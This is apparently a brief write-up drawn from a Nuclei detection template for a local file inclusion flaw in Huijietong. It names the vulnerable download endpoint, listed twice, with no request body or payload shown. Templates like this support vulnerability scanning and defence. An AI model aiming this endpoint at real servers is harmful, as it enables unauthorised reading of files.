# Nuclei Template: Huijietong - Local File Inclusion
**Template ID:** huijietong-cloud-fileread
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`huijietong-cloud-fileread.yaml`)

## Vulnerability Information & PoC

## Description
Huijietong is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
POST {{BaseURL}}/fileDownload?action=downloadBackupFile
POST {{BaseURL}}/fileDownload?action=downloadBackupFile
```

